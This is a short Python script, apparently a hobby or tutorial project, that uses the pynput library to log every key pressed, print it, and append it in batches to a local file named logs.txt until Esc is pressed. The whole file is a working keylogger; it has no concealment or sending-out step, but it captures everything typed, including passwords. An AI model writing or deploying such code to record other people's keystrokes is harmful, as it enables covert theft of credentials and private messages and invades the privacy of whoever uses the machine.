#monitoring keyboard strokes library and variables

import pynput
from pynput.keyboard import Key, Listener

# keys - ongoing list of keystrokes count - timer still file save
count = 0
keys = []

#on_press - to track every key pressed w save counter

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

#saves text file after each cycle

def write_file(keys):
    with open("logs.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

#program ends with esc press

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
